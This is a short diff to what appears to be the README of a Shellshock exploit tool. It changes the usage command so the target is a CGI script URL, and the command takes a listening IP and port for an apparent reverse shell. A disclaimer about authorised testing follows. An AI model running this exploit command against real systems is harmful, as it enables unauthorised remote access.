@@ -32,7 +32,7 @@ cd Shellshock
 
 Run the shellshock.py script.
 ```
-python3 shellshock.py http://vulnerable-website.com listening_interface_IP listening_port
+python3 shellshock.py http://vulnerable-website.com/cgi-bin/test.cgi listening_interface_IP listening_port
 ```
 
 ###### Please remember that this exploit should never be used against real software or systems you're not authorized to test. Unauthorized access or any malicious activity is illegal.
